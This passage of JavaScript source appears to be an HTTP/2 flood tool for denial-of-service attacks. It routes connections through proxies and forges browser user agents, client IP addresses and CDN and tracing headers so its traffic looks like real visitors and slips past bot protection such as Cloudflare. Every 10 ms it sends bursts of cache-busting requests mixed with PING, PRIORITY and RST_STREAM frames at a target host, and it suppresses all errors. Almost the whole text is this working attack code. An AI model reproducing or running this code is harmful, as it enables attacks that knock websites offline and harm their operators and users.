    epic: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 25)}.0.${Math.floor(Math.random() * 9999)}.${Math.floor(Math.random() * 999)} Safari/537.36 Epic/${Math.floor(90 + Math.random() * 25)}.0.${Math.floor(Math.random() * 999)}.${Math.floor(Math.random() * 99)}`,
    waterfox: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${Math.floor(2022 + Math.random() * 3)}.0) Gecko/20100101 Firefox/${Math.floor(2022 + Math.random() * 3)}.0 Waterfox/${Math.floor(2022 + Math.random() * 3)}.0`
};
    
    const ip = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    const ip2 = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    const ip3 = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    
    const headersMap = {
        chrome: {
            ":method": Math.random() < 0.7 ? "GET" : "POST",
            ":authority": Math.random() < 0.5 ? parsedTarget.host : "www." + parsedTarget.host,
            ":scheme": "https",
            ":path": (parsedTarget.path || "/") + "?" + generateRandomString(3, 8) + "=" + generateRandomString(10, 50) + "&_" + Date.now() + randstr(12) + "&cache=" + randstr(16),
            "sec-ch-ua": `"Chromium";v="${Math.floor(115 + Math.random() * 25)}", "Google Chrome";v="${Math.floor(115 + Math.random() * 25)}", "Not=A?Brand";v="${Math.floor(8 + Math.random() * 92)}"`,
            "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
            "sec-ch-ua-platform": Math.random() < 0.33 ? '"Windows"' : Math.random() < 0.5 ? '"Linux"' : '"Android"',
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "user-agent": userAgents.chrome,
            "accept-language": Math.random() < 0.33 ? "en-US,en;q=0.9" : Math.random() < 0.5 ? "id-ID,id;q=0.9" : "ja-JP,ja;q=0.9",
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br",
            "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://www.bing.com/",
            "x-forwarded-for": ip,
            "x-real-ip": ip2,
            "x-client-ip": ip3,
            "cf-connecting-ip": ip,
            "true-client-ip": ip,
            "x-forwarded-host": parsedTarget.host,
            "x-forwarded-proto": "https",
            "x-forwarded-port": "443",
            "x-forwarded-scheme": "https",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": Math.random() < 0.5 ? "same-origin" : "cross-site",
            "sec-fetch-user": "?1",
            "dnt": Math.random() < 0.5 ? "1" : "0",
            "upgrade-insecure-requests": "1",
            "cache-control": Math.random() < 0.5 ? "no-cache" : "max-age=0",
            "pragma": "no-cache",
            "te": "trailers",
            "priority": "u=1, i",
            "sec-gpc": Math.random() < 0.5 ? "1" : "0",
            "cf-ray": `${randstr(8)}-${randstr(3)}`,
            "cf-visitor": '{"scheme":"https"}',
            "cf-ipcountry": Math.random() < 0.33 ? "US" : Math.random() < 0.5 ? "ID" : "JP",
            "cf-worker": randstr(16),
            "cf-cache-status": "MISS",
            "cf-request-id": randstr(32),
            "x-csrf-token": randstr(32),
            "x-auth-token": randstr(40),
            "x-api-key": randstr(48),
            "x-device-id": randstr(16),
            "x-session-id": randstr(24),
            "x-correlation-id": randstr(16),
            "x-trace-id": randstr(16),
            "x-request-id": randstr(16),
            "x-cloud-trace-context": randstr(32),
            "x-appengine-country": "ZZ",
            "x-goog-api-client": "gl-js/ fire/9.10.0",
            "x-wap-profile": "http://www.google.com/oha/rdf/oga-rdf.xml",
            "x-operamini-phone-ua": userAgents.chrome,
            "x-uidh": randstr(32),
            "x-dtpc": randstr(20),
            "x-p2p": "peer",
            "x-p2p-peerdist": "Version=1.0, ContentInfo=0.0",
            "x-msedge-ref": randstr(40),
            "akamai-origin-hop": "1",
            "x-akamai-config-log-detail": "true",
            "fastly-ff": randstr(32),
            "x-b3-traceid": randstr(16),
            "x-b3-spanid": randstr(16),
            "x-b3-parentspanid": randstr(16),
            "x-b3-sampled": "1",
            "x-b3-flags": "0",
            "x-request-start": `t=${Date.now()}`,
            "x-amzn-trace-id": `Root=${randstr(8)}-${randstr(4)}-${randstr(4)}-${randstr(4)}-${randstr(12)}`,
            "x-newrelic-id": randstr(16),
            "x-newrelic-transaction": randstr(16),
            "x-datadog-trace-id": randstr(16),
            "x-datadog-parent-id": randstr(16),
            "x-datadog-sampling-priority": "1",
            "x-sentry-trace": `${randstr(16)}-${randstr(8)}-1`,
            "x-opentelemetry-context": randstr(32),
            "x-azure-ref": randstr(32),
            "x-azure-client-ip": ip,
            "x-azure-socketip": ip2,
            "x-azure-forwarded-for": ip3,
            "x-aws-request-id": randstr(16),
            "x-aws-cf-id": randstr(64),
            "x-cloudfront-viewer-country": Math.random() < 0.33 ? "US" : Math.random() < 0.5 ? "ID" : "JP",
            "x-cloudfront-is-tablet-viewer": "false",
            "x-cloudfront-is-mobile-viewer": "false",
            "x-cloudfront-is-smarttv-viewer": "false",
            "x-cloudfront-is-desktop-viewer": "true",
            "via": `1.1 ${randstr(8)}`,
            "x-via": randstr(8),
            "x-arr-log-id": randstr(32),
            "x-arr-ssl": "2048|256|C=US, O=DigiCert Inc, OU=www.digicert.com, CN=DigiCert SHA2 Secure Server CA|CN=*." + parsedTarget.host,
            "front-end-https": "on",
            "x-att-deviceid": randstr(16),
            "x-originating-ip": ip,
            "x-remote-ip": ip2,
            "x-remote-addr": ip3,
            "x-host": parsedTarget.host,
            "x-original-host": parsedTarget.host,
            "x-original-url": parsedTarget.path || "/",
            "x-rewrite-url": parsedTarget.path || "/",
            "x-envoy-external-address": ip,
            "x-envoy-internal": "true",
            "x-envoy-attempt-count": "1",
            "x-requested-with": "XMLHttpRequest",
            "x-http-method-override": "GET",
            "x-wap-profile": "http://wap.samsungmobile.com/uaprof/GT-I9500.xml",
            "x-ucbrowser-ua": userAgents.ucbrowser,
            "x-ucbrowser-device-ua": userAgents.mobile,
            "x-ucbrowser-phone-ua": userAgents.mobile
        }
    };
    
    const baseHeaders = headersMap.chrome;
    
    const browserSpecific = {
        firefox: {
            "sec-ch-ua": `"Mozilla Firefox";v="${Math.floor(99 + Math.random() * 31)}", "Gecko";v="20100101", "Not-A.Brand";v="${Math.floor(8 + Math.random() * 92)}"`,
            "user-agent": userAgents.firefox
        },
        safari: {
            "sec-ch-ua": `"Safari";v="${Math.floor(14 + Math.random() * 7)}", "AppleWebKit";v="${Math.floor(605 + Math.random() * 10)}"`,
            "user-agent": userAgents.safari
        },
        mobile: {
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "user-agent": userAgents.mobile
        },
        brave: {
            "sec-ch-ua": `"Brave";v="${Math.floor(115 + Math.random() * 25)}", "Chromium";v="${Math.floor(115 + Math.random() * 25)}", "Not=A?Brand";v="${Math.floor(8 + Math.random() * 92)}"`,
            "user-agent": userAgents.brave
        }
    };
    
    return { ...baseHeaders, ...(browserSpecific[browser] || {}) };
};
const browser = getRandomBrowser();
const headers = generateHeaders(browser);
let h2_config;
const h2settings = h2Settings(browser);
h2_config = transformSettings(Object.entries(h2settings));
function getWeightedRandom() {
    const randomValue = Math.random() * Math.random();
    return randomValue < 0.25;
}
const randomString = randstr(10);

                        const headers4 = {
                            ...(getWeightedRandom() && Math.random() < 0.4 && { 'x-forwarded-for': `${randomString}:${randomString}` }),
                            ...(getWeightedRandom() && { 'referer': `https://${randomString}.com` }),
                            ...(Math.random() < 0.3 && { 'cf-ipcountry': Math.random() < 0.33 ? 'US' : Math.random() < 0.5 ? 'ID' : 'JP' }),
                            ...(Math.random() < 0.3 && { 'cf-ray': `${randstr(8)}-${randstr(3)}` }),
                            ...(Math.random() < 0.3 && { 'cf-visitor': '{"scheme":"https"}' }),
                            ...(Math.random() < 0.3 && { 'sec-gpc': Math.random() < 0.5 ? '1' : '0' }),
                            ...(Math.random() < 0.3 && { 'priority': 'u=1, i' }),
                            ...(Math.random() < 0.3 && { 'x-csrf-token': randstr(32) }),
                            ...(Math.random() < 0.3 && { 'x-auth-token': randstr(40) }),
                            ...(Math.random() < 0.3 && { 'x-api-key': randstr(48) }),
                            ...(Math.random() < 0.3 && { 'x-device-id': randstr(16) }),
                            ...(Math.random() < 0.3 && { 'x-session-id': randstr(24) }),
                            ...(Math.random() < 0.3 && { 'x-correlation-id': randstr(16) }),
                            ...(Math.random() < 0.3 && { 'x-trace-id': randstr(16) }),
                            ...(Math.random() < 0.3 && { 'x-request-id': randstr(16) }),
                            ...(Math.random() < 0.3 && { 'x-cloud-trace-context': randstr(32) }),
                            ...(Math.random() < 0.3 && { 'x-appengine-country': 'ZZ' }),
                            ...(Math.random() < 0.3 && { 'x-goog-api-client': 'gl-js/ fire/9.10.0' }),
                            ...(Math.random() < 0.3 && { 'x-wap-profile': 'http://www.google.com/oha/rdf/oga-rdf.xml' }),
                            ...(Math.random() < 0.3 && { 'x-uidh': randstr(32) }),
                            ...(Math.random() < 0.3 && { 'x-dtpc': randstr(20) }),
                            ...(Math.random() < 0.3 && { 'x-p2p': 'peer' }),
                            ...(Math.random() < 0.3 && { 'x-p2p-peerdist': 'Version=1.0, ContentInfo=0.0' }),
                            ...(Math.random() < 0.3 && { 'x-msedge-ref': randstr(40) }),
                            ...(Math.random() < 0.3 && { 'akamai-origin-hop': '1' }),
                            ...(Math.random() < 0.3 && { 'x-akamai-config-log-detail': 'true' }),
                            ...(Math.random() < 0.3 && { 'fastly-ff': randstr(32) }),
                            ...(Math.random() < 0.3 && { 'cf-worker': randstr(16) }),
                            ...(Math.random() < 0.3 && { 'x-b3-traceid': randstr(16) }),
                            ...(Math.random() < 0.3 && { 'x-b3-spanid': randstr(16) }),
                            ...(Math.random() < 0.3 && { 'x-b3-parentspanid': randstr(16) }),
                            ...(Math.random() < 0.3 && { 'x-b3-sampled': '1' }),
                            ...(Math.random() < 0.3 && { 'x-b3-flags': '0' }),
                            ...(Math.random() < 0.3 && { 'x-request-start': `t=${Date.now()}` }),
                            ...(Math.random() < 0.3 && { 'x-amzn-trace-id': `Root=${randstr(8)}-${randstr(4)}-${randstr(4)}-${randstr(4)}-${randstr(12)}` }),
                            ...(Math.random() < 0.3 && { 'x-newrelic-id': randstr(16) }),
                            ...(Math.random() < 0.3 && { 'x-newrelic-transaction': randstr(16) }),
                            ...(Math.random() < 0.3 && { 'x-datadog-trace-id': randstr(16) }),
                            ...(Math.random() < 0.3 && { 'x-datadog-parent-id': randstr(16) }),
                            ...(Math.random() < 0.3 && { 'x-datadog-sampling-priority': '1' }),
                            ...(Math.random() < 0.3 && { 'x-sentry-trace': `${randstr(16)}-${randstr(8)}-1` }),
                            ...(Math.random() < 0.3 && { 'x-opentelemetry-context': randstr(32) }),
                            ...(Math.random() < 0.3 && { 'x-azure-ref': randstr(32) }),
                            ...(Math.random() < 0.3 && { 'x-azure-client-ip': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}` }),
                            ...(Math.random() < 0.3 && { 'x-azure-socketip': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}` }),
                            ...(Math.random() < 0.3 && { 'x-azure-forwarded-for': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}` }),
                            ...(Math.random() < 0.3 && { 'x-aws-request-id': randstr(16) }),
                            ...(Math.random() < 0.3 && { 'x-aws-cf-id': randstr(64) }),
                            ...(Math.random() < 0.3 && { 'x-cloudfront-viewer-country': Math.random() < 0.33 ? 'US' : Math.random() < 0.5 ? 'ID' : 'JP' }),
                            ...(Math.random() < 0.3 && { 'x-cloudfront-is-tablet-viewer': 'false' }),
                            ...(Math.random() < 0.3 && { 'x-cloudfront-is-mobile-viewer': 'false' }),
                            ...(Math.random() < 0.3 && { 'x-cloudfront-is-smarttv-viewer': 'false' }),
                            ...(Math.random() < 0.3 && { 'x-cloudfront-is-desktop-viewer': 'true' }),
                            ...(Math.random() < 0.3 && { 'via': `1.1 ${randstr(8)}` }),
                            ...(Math.random() < 0.3 && { 'x-via': randstr(8) }),
                            ...(Math.random() < 0.3 && { 'x-arr-log-id': randstr(32) }),
                            ...(Math.random() < 0.3 && { 'x-arr-ssl': '2048|256|C=US, O=DigiCert Inc, OU=www.digicert.com, CN=DigiCert SHA2 Secure Server CA|CN=*.' + parsedTarget.host }),
                            ...(Math.random() < 0.3 && { 'front-end-https': 'on' }),
                            ...(Math.random() < 0.3 && { 'x-att-deviceid': randstr(16) }),
                            ...(Math.random() < 0.3 && { 'x-originating-ip': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}` }),
                            ...(Math.random() < 0.3 && { 'x-remote-ip': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}` }),
                            ...(Math.random() < 0.3 && { 'x-remote-addr': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}` }),
                            ...(Math.random() < 0.3 && { 'x-host': parsedTarget.host }),
                            ...(Math.random() < 0.3 && { 'x-original-host': parsedTarget.host }),
                            ...(Math.random() < 0.3 && { 'x-original-url': parsedTarget.path || '/' }),
                            ...(Math.random() < 0.3 && { 'x-rewrite-url': parsedTarget.path || '/' }),
                            ...(Math.random() < 0.3 && { 'x-envoy-external-address': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}` }),
                            ...(Math.random() < 0.3 && { 'x-envoy-internal': 'true' }),
                            ...(Math.random() < 0.3 && { 'x-envoy-attempt-count': '1' }),
                            ...(Math.random() < 0.3 && { 'x-requested-with': 'XMLHttpRequest' }),
                            ...(Math.random() < 0.3 && { 'x-http-method-override': 'GET' }),
                            ...(Math.random() < 0.3 && { 'x-wap-profile': 'http://wap.samsungmobile.com/uaprof/GT-I9500.xml' }),
                            ...(Math.random() < 0.3 && { 'x-ucbrowser-ua': userAgents.ucbrowser }),
                            ...(Math.random() < 0.3 && { 'x-ucbrowser-device-ua': userAgents.mobile }),
                            ...(Math.random() < 0.3 && { 'x-ucbrowser-phone-ua': userAgents.mobile }),
                            ...(Math.random() < 0.3 && { ['x-custom-' + randstr(6)]: randstr(12) }),
                            ...(Math.random() < 0.3 && { ['cf-' + randstr(8)]: randstr(16) }),
                            ...(Math.random() < 0.3 && { ['x-edge-' + randstr(5)]: randstr(20) }),
                            ...(Math.random() < 0.3 && { ['x-amzn-' + randstr(4)]: randstr(24) }),
                            ...(Math.random() < 0.3 && { ['x-goog-' + randstr(5)]: randstr(28) }),
                            ...(Math.random() < 0.3 && { ['x-azure-' + randstr(6)]: randstr(32) }),
                            ...(Math.random() < 0.3 && { ['x-aws-' + randstr(7)]: randstr(36) }),
                            ...(Math.random() < 0.3 && { ['x-cloud-' + randstr(8)]: randstr(40) })
                        }

                        let allHeaders = Object.assign({}, headers, headers4);


const proxyOptions = {
    host: parsedProxy[0],
    port: ~~parsedProxy[1],
    address: `${parsedTarget.host}:443`,
    timeout: 10
};

Socker.HTTP(proxyOptions, async (connection, error) => {
    if (error) return;
    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true);

    const settings = {
        initialWindowSize: 67108864,
    };

    const tlsOptions = {
        secure: true,
        ALPNProtocols: ["h2", "http/1.1", "spdy/3.1", "http/1.0"],
        ciphers: cipper,
        requestCert: true,
        sigalgs: sigalgs,
        socket: connection,
        ecdhCurve: ecdhCurve,
        secureContext: secureContext,
        honorCipherOrder: false,
        rejectUnauthorized: false,
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        secureOptions: secureOptions,
        host: parsedTarget.host,
        servername: parsedTarget.host,
        session: undefined,
        requestOCSP: Math.random() < 0.5
    };
    const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
    
    tlsSocket.allowHalfOpen = true;
    tlsSocket.setNoDelay(true);
    tlsSocket.setKeepAlive(true, 60000);
    tlsSocket.setMaxListeners(0);
    
    function generateJA3Fingerprint(socket) {
        const cipherInfo = socket.getCipher();
        const supportedVersions = socket.getProtocol();
    
        if (!cipherInfo) {
            return null;
        }
    
        const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
    
        const md5Hash = crypto.createHash('md5');
        md5Hash.update(ja3String);
        return md5Hash.digest('hex');
    }
    
    tlsSocket.on('connect', () => {
        const ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
    });
    let hpack = new HPACK();
    let client;
    client = http2.connect(parsedTarget.href, {
        protocol: "https",
        createConnection: () => tlsSocket,
        settings : h2settings,
        socket: tlsSocket,
    });
    
    client.setMaxListeners(0);
    
    const updateWindow = Buffer.alloc(4);
    updateWindow.writeUInt32BE(Math.floor(Math.random() * (134217728 - 67108864 + 1)) + 67108864, 0);
    client.on('remoteSettings', (settings) => {
        const localWindowSize = Math.floor(Math.random() * (134217728 - 67108864 + 1)) + 67108864;
        client.setLocalWindowSize(localWindowSize, 0);
    });
    
    const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
    const frames = [
        Buffer.from(PREFACE, 'binary'),
        encodeFrame(0, 4, encodeSettings([...h2_config])),
        encodeFrame(0, 8, updateWindow),
        encodeFrame(0, 6, Buffer.from([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])),
        encodeFrame(0, 2, Buffer.from([0x00, 0x00, 0x00, 0x00, 0x00]), 0x00)
    ];
    
    client.on('connect', async () => {
        const intervalId = setInterval(async () => {
            const shuffleObject = (obj) => {
                const keys = Object.keys(obj);
                for (let i = keys.length - 1; i > 0; i--) {
                    const j = Math.floor(Math.random() * (i + 1));
                    [keys[i], keys[j]] = [keys[j], keys[i]];
                }
                const shuffledObj = {};
                keys.forEach(key => shuffledObj[key] = obj[key]);
                return shuffledObj;
            };
    
            const randomItem = (array) => array[Math.floor(Math.random() * array.length)];
    
            const dynHeaders = shuffleObject({
                ...allHeaders,
                ...(Math.random() < 0.5 ? {"Cache-Control": "max-age=0"} :{}),
                ...(Math.random() < 0.5 ? {["MOMENT" + randstr(4)]: "POLOM" + generateRandomString(1,5) } : {["X-FRAMES" + generateRandomString(1,4)]: "NAVIGATE"+ randstr(3)}),
                ...(Math.random() < 0.3 ? {["X-CUSTOM-" + randstr(6)]: randstr(12)} : {}),
                ...(Math.random() < 0.3 ? {["CF-" + randstr(8)]: randstr(16)} : {}),
                ...(Math.random() < 0.3 ? {["X-EDGE-" + randstr(5)]: randstr(20)} : {}),
                ...(Math.random() < 0.3 ? {["X-AMZN-" + randstr(4)]: randstr(24)} : {}),
                ...(Math.random() < 0.3 ? {["X-GOOG-" + randstr(5)]: randstr(28)} : {}),
                ...(Math.random() < 0.3 ? {["X-AZURE-" + randstr(6)]: randstr(32)} : {}),
                ...(Math.random() < 0.3 ? {["X-AWS-" + randstr(7)]: randstr(36)} : {}),
                ...(Math.random() < 0.3 ? {["X-CLOUD-" + randstr(8)]: randstr(40)} : {}),
                ...(Math.random() < 0.3 ? {["X-SERVER-" + randstr(9)]: randstr(44)} : {}),
                ...(Math.random() < 0.3 ? {["X-NETWORK-" + randstr(10)]: randstr(48)} : {}),
                ...(Math.random() < 0.3 ? {["X-SYSTEM-" + randstr(11)]: randstr(52)} : {}),
                ...(Math.random() < 0.3 ? {["X-APPLICATION-" + randstr(12)]: randstr(56)} : {}),
                ...(Math.random() < 0.3 ? {["X-SERVICE-" + randstr(13)]: randstr(60)} : {})
            });
    
            const packed = Buffer.concat([
                Buffer.from([0x80, 0, 0, 0, 0xFF]),
                hpack.encode(dynHeaders)
            ]);
    
            const streamId = Math.floor(Math.random() * 1000000) * 2 + 1;
            const requests = [];
            let count = 0;
    
            if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
                for (let i = 0; i < Math.min(args.Rate, 30); i++) {
                    const requestPromise = new Promise((resolve, reject) => {
                        const req = client.request(dynHeaders)
                        .on('response', response => {
                            req.close();
                            req.destroy();
                            resolve();
                        });
                        req.on('end', () => {
                            count++;
                            if (count === args.time * args.Rate) {
                                clearInterval(intervalId);
                                client.close(http2.constants.NGHTTP2_CANCEL);
                            }
                            reject(new Error('Request timed out'));
                        });
    
                        req.end();
                    });
    
                    const frame = encodeFrame(streamId + i, 1, packed, 0x1 | 0x4 | 0x20);
                    requests.push({ requestPromise, frame });
                    
                    if (Math.random() < 0.3) {
                        const pingFrame = encodeFrame(0, 6, Buffer.from([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]), 0x00);
                        client.write(pingFrame);
                    }
                    
                    if (Math.random() < 0.2) {
                        const windowUpdate = encodeFrame(streamId + i, 8, Buffer.from([0x00, 0x80, 0x00, 0x00]), 0x00);
                        client.write(windowUpdate);
                    }
                    
                    if (Math.random() < 0.1) {
                        const priorityFrame = encodeFrame(streamId + i, 2, Buffer.from([0x00, 0x00, 0x00, 0x00, 0x00]), 0x00);
                        client.write(priorityFrame);
                    }
                    
                    if (Math.random() < 0.05) {
                        const rstStream = encodeFrame(streamId + i, 3, Buffer.from([0x00, 0x00, 0x00, 0x00]), 0x00);
                        client.write(rstStream);
                    }
                }
    
                await Promise.all(requests.map(({ requestPromise }) => requestPromise));
                client.write(Buffer.concat(frames));
            }
        }, 10);
    });
    
        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return;
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return;
        });
        });
    }
const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});

if (global.gc) {
    setInterval(() => {
        global.gc();
    }, 5000);
}